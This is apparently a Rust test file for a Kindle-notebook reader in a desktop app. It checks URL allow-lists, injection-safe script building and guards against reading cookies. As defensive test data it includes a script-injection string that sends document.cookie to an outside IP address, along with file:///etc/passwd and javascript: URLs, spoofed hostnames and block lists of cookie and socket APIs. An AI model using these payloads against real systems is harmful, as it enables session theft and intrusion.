//! The host's rules that need no window: where each window may go, what a
//! page script is and how its answer is read, and the guards that keep a
//! cookie, or an HTTP client of the host's own, out of this module.
//!
//! The windows themselves (sign-in, the hidden reader, the data store) are
//! WebKit on the main thread and have no automated test; ADR-0044 and the
//! PR list what is checked by hand. Nothing here opens a socket.

use super::failure::FailureKind;
use super::notebook_url::{notebook_url, shown_target};
use super::page_script::{fetch_script, read_answer, KindlePage, ScriptAnswer, MAX_PAGE_BYTES};
use super::{path_and_query, reader_may_load, sign_in_may_load};
use reqwest::Url;

fn origin() -> Url {
    Url::parse("https://read.amazon.com").unwrap()
}

// ---- Where each window may go ---------------------------------------------

#[test]
fn the_sign_in_window_may_go_to_amazon_over_https_and_nowhere_else() {
    for allowed in [
        "about:blank",
        "https://read.amazon.com/notebook",
        "https://www.amazon.com/ap/signin?openid.return_to=x",
        "https://amazon.com/",
        "https://WWW.Amazon.com/ap/mfa",
    ] {
        assert!(sign_in_may_load(allowed), "{allowed}");
    }
    for refused in [
        "http://www.amazon.com/ap/signin",
        "https://www.amazon.com:8443/",
        "https://amazon.com.invalid/",
        "https://evilamazon.com/",
        "https://203.0.113.1/?amazon.com",
        "file:///etc/passwd",
        "javascript:alert(1)",
        "tauri://localhost/",
        "",
    ] {
        assert!(!sign_in_may_load(refused), "{refused}");
    }
}

#[test]
fn the_hidden_window_may_load_the_notebook_and_not_amazons_sign_in() {
    for allowed in [
        "about:blank",
        "https://read.amazon.com/notebook",
        "https://read.amazon.com/notebook?asin=B0EXAMPLE1&contentLimitState=&token=",
        "https://read.amazon.com/kp/notebook",
    ] {
        assert!(reader_may_load(allowed), "{allowed}");
    }
    for refused in [
        "https://www.amazon.com/ap/signin?openid.return_to=notebook",
        "https://read.amazon.com/ap/signin",
        "https://read.amazon.com/errors/validateCaptcha",
        // Another Amazon store's notebook is another origin: not read, and
        // reported (as a redirect) for TypeScript to name.
        "https://read.amazon.co.uk/notebook",
        "http://read.amazon.com/notebook",
        "javascript:alert(1)",
        "data:text/html,<p>x</p>",
        "file:///etc/passwd",
        "tauri://localhost/",
        "not a url",
        "",
    ] {
        assert!(!reader_may_load(refused), "{refused}");
    }
}

#[test]
fn hostile_addresses_are_all_refused() {
    for raw in [
        "https://read.amazon.com.evil.example/notebook",
        "https://read.amazon.com@evil.example/notebook",
        "https://read.amazon.com:@evil.example/notebook",
        "https://user:pass@read.amazon.com/notebook",
        "https://read.amazon.com:444/notebook",
        "https://read.amazon.com./notebook",
        "https://xn--rad-sdd.amazon.com/notebook",
        "https://r\u{0435}ad.amazon.com/notebook",
        "https://read.amazon.com/notebook/../ap/signin",
        "https://read.amazon.com/notebook/%2e%2e/ap/signin",
        "https://read.amazon.com/notebook%2F..%2Fap",
        "https://read.amazon.com/notebook%3Fasin=x",
        "https://read.amazon.com/notebook;jsessionid=x",
        "https://read.amazon.com/NOTEBOOK",
        "https://read.amazon.com/notebook#",
        "https://read.amazon.com/notebook?asin=x#frag",
        "wss://read.amazon.com/notebook",
        "ftp://read.amazon.com/notebook",
        "https://54.239.0.1/notebook",
        "https://[::1]/notebook",
        "//read.amazon.com/notebook",
    ] {
        assert!(notebook_url(&origin(), raw).is_err(), "{raw}");
        assert!(!reader_may_load(raw), "{raw}");
    }
}

#[test]
fn an_address_off_the_notebook_is_refused_with_its_own_kind() {
    let failure = notebook_url(&origin(), "https://read.amazon.com/ap/signin").unwrap_err();
    assert_eq!(failure.kind, FailureKind::Refused);
}

#[test]
fn the_window_is_given_the_path_and_query_of_the_validated_address_only() {
    let url = notebook_url(
        &origin(),
        "https://read.amazon.com/notebook?asin=B0EXAMPLE1&contentLimitState=&token=CgUIAhCeAg",
    )
    .unwrap();
    assert_eq!(
        path_and_query(&url),
        "/notebook?asin=B0EXAMPLE1&contentLimitState=&token=CgUIAhCeAg"
    );
    let library = notebook_url(&origin(), "https://read.amazon.com/notebook").unwrap();
    assert_eq!(path_and_query(&library), "/notebook");
}

// ---- Where a redirect pointed ---------------------------------------------

#[test]
fn a_redirect_is_shown_as_its_origin_and_path_never_its_query_user_info_or_fragment() {
    assert_eq!(
        shown_target("https://www.amazon.com/ap/signin?openid.return_to=x&token=SECRET#frag"),
        "https://www.amazon.com/ap/signin"
    );
    // A session value in a path is the page's to name; the query and user
    // info, where tokens go, never are.
    assert_eq!(
        shown_target("https://ida:secret@www.amazon.com/ap/signin?a=b"),
        "https://www.amazon.com/ap/signin"
    );
    assert_eq!(shown_target("not a url"), "");
}

// ---- The page script --------------------------------------------------------

#[test]
fn the_script_names_its_target_as_a_json_string_that_nothing_can_end() {
    let hostile = "/notebook?x=\";fetch('https://203.0.113.1/'+document.cookie);//\n\u{2028}";
    let script = fetch_script(hostile);
    let expected = format!(
        "const target = {};",
        serde_json::to_string(hostile).unwrap()
    );
    assert!(script.starts_with(&expected), "{script}");
    // The only unescaped quote after the declaration is the literal's own.
    assert_eq!(script.matches("fetch(target,").count(), 1, "{script}");
}

#[test]
fn the_script_stays_on_the_notebook_origin_and_reads_no_cookie_or_error_message() {
    let script = fetch_script("/notebook");
    assert!(script.contains("location.origin !== \"https://read.amazon.com\""));
    assert!(script.contains("credentials: \"same-origin\""));
    for forbidden in [
        "document.cookie",
        "localStorage",
        "sessionStorage",
        "XMLHttpRequest",
        "WebSocket",
        "postMessage",
        "error.message",
        "webkit.messageHandlers",
        "__TAURI",
    ] {
        assert!(!script.contains(forbidden), "{forbidden}");
    }
}

#[test]
fn a_page_comes_back_as_its_status_and_html() {
    let answer = read_answer(r#"{"kind":"page","status":200,"html":"<p>x</p>"}"#).unwrap();
    assert_eq!(
        answer,
        ScriptAnswer::Page(KindlePage {
            status: 200,
            html: "<p>x</p>".into(),
            redirected_to: None,
        })
    );
    let unavailable = read_answer(r#"{"kind":"page","status":503,"html":""}"#).unwrap();
    assert!(matches!(unavailable, ScriptAnswer::Page(page) if page.status == 503));
}

#[test]
fn a_page_sent_elsewhere_comes_back_as_a_redirect_without_its_query() {
    let answer =
        read_answer(r#"{"kind":"moved","target":"https://read.amazon.com/captcha?token=SECRET"}"#)
            .unwrap();
    assert_eq!(
        answer,
        ScriptAnswer::Page(KindlePage {
            status: 302,
            html: String::new(),
            redirected_to: Some("https://read.amazon.com/captcha".into()),
        })
    );
}

#[test]
fn a_fetch_that_failed_is_never_a_page_and_the_navigation_is_asked_instead() {
    // What a cut-off page, a lost connection and a cross-origin redirect to
    // Amazon's sign-in all look like to a script: the fetch rejects.
    assert_eq!(
        read_answer(r#"{"kind":"failed"}"#).unwrap(),
        ScriptAnswer::LookAtNavigation
    );
}

#[test]
fn a_page_larger_than_the_host_reads_is_too_large() {
    let by_the_script = read_answer(r#"{"kind":"too_large"}"#).unwrap_err();
    assert_eq!(by_the_script.kind, FailureKind::TooLarge);
    let html = "x".repeat(MAX_PAGE_BYTES + 1);
    let by_the_host = read_answer(&format!(
        r#"{{"kind":"page","status":200,"html":"{html}"}}"#
    ))
    .unwrap_err();
    assert_eq!(by_the_host.kind, FailureKind::TooLarge);
}

#[test]
fn an_answer_in_any_other_shape_is_refused_not_guessed_at() {
    for json in [
        "",
        "null",
        "[]",
        r#"{"kind":"page"}"#,
        r#"{"kind":"page","status":"200","html":""}"#,
        r#"{"kind":"elsewhere"}"#,
        r#"{"kind":"surprise"}"#,
        // A page cut off mid-way is not JSON.
        r#"{"kind":"page","status":200,"html":"<div id=\"kp-notebook-lib"#,
    ] {
        let failure = read_answer(json).unwrap_err();
        assert_eq!(failure.kind, FailureKind::Refused, "{json}");
    }
}

// ---- Guards -----------------------------------------------------------------

/// The module's code, without its comment lines, which may name what it forbids.
fn code(source: &str) -> String {
    source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n")
}

#[test]
fn the_host_never_reads_a_cookie_and_has_no_http_client_of_its_own() {
    // The session stays inside WebKit (ADR-0044): a cookie that is never read
    // cannot be logged, struck, or sent in an IPC payload, and a page that is
    // fetched from the hidden window goes the way the window's traffic does
    // (the system's proxy settings and certificate trust), never around them.
    let sources = [
        ("kindle.rs", code(include_str!("../kindle.rs"))),
        ("failure.rs", code(include_str!("failure.rs"))),
        ("notebook_url.rs", code(include_str!("notebook_url.rs"))),
        ("page_script.rs", code(include_str!("page_script.rs"))),
        ("session_macos.rs", code(include_str!("session_macos.rs"))),
    ];
    for (name, source) in &sources {
        for forbidden in [
            "NSHTTPCookie",
            "WKHTTPCookieStore",
            "httpCookieStore",
            "getAllCookies",
            "cookie_header",
            "Set-Cookie",
            "document.cookie",
            "reqwest::Client",
            "reqwest::get",
            "hyper",
            "TcpStream",
            "tokio::net",
        ] {
            assert!(!source.contains(forbidden), "{name} mentions {forbidden}");
        }
    }
}

#[test]
fn neither_window_has_a_way_into_the_app() {
    // No script message handler, no user script, no Tauri scheme handler: a
    // bare WKWebView, as the PDF export's is. `__TAURI_INTERNALS__` being
    // undefined in both windows is on the PR's manual checklist.
    let source = code(include_str!("session_macos.rs"));
    for forbidden in [
        "addScriptMessageHandler",
        "WKUserContentController",
        "WKUserScript",
        "setURLSchemeHandler",
        "initialization_script",
        "tauri::",
    ] {
        assert!(
            !source.contains(forbidden),
            "session_macos.rs mentions {forbidden}"
        );
    }
}

// ---- Verification of PR #511 after its fix round ---------------------------

#[test]
fn a_redirect_to_an_address_with_no_origin_is_shown_as_nothing_not_its_contents() {
    // An opaque address's "path" is all of it: a mail address, a data payload.
    for raw in [
        "mailto:ida.brenwick@example.com",
        "data:text/html;base64,U0VTU0lPTj1zZWNyZXQ=",
    ] {
        assert_eq!(shown_target(raw), "", "{raw}");
    }
}

#[test]
fn every_accepted_address_is_fetched_on_the_notebook_origin_at_a_notebook_path() {
    // The window resolves the target against the notebook page it is on, as `fetch` does.
    let page = Url::parse("https://read.amazon.com/notebook").unwrap();
    let mut accepted = 0;
    for raw in [
        "https://read.amazon.com/notebook?asin=//evil.example/x",
        "https://read.amazon.com/notebook?asin=\\\\evil.example\\x",
        "https://read.amazon.com/notebook?token=%2F%2Fevil.example&x=@evil.example",
        "https://read.amazon.com//notebook",
        "https://read.amazon.com/\\notebook",
        "https://read.amazon.com/kp/notebook?asin=B0\tEX\nAMPLE",
        "https://read.amazon.com/notebook?a=\u{2028}\u{2029}</script>",
    ] {
        let Ok(url) = notebook_url(&origin(), raw) else {
            continue;
        };
        accepted += 1;
        let fetched = page.join(&path_and_query(&url)).unwrap();
        assert_eq!(fetched.origin(), origin().origin(), "{raw}");
        assert!(reader_may_load(fetched.as_str()), "{raw} -> {fetched}");
    }
    // The hostile queries are accepted (and so reach the script); the paths are not.
    assert_eq!(accepted, 5);
}

#[test]
fn the_cookie_and_http_guard_scans_every_kindle_source_file() {
    // A new file under kindle/ that the guard does not include is a file it does not police.
    let guard = include_str!("tests.rs");
    let folder = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/kindle");
    for entry in std::fs::read_dir(folder).unwrap() {
        let name = entry.unwrap().file_name().into_string().unwrap();
        if name.ends_with(".rs") && name != "tests.rs" {
            assert!(
                guard.contains(&format!("include_str!(\"{name}\")")),
                "{name} is not scanned"
            );
        }
    }
}

#[test]
fn kindle_names_reqwest_only_for_its_url_type() {
    // `use reqwest::{Client, Url}` would pass the guard's "reqwest::Client" check unseen.
    for source in [
        code(include_str!("../kindle.rs")),
        code(include_str!("notebook_url.rs")),
        code(include_str!("page_script.rs")),
        code(include_str!("session_macos.rs")),
        code(include_str!("failure.rs")),
    ] {
        assert_eq!(
            source.matches("reqwest").count(),
            source.matches("reqwest::Url").count(),
            "{source}"
        );
    }
}
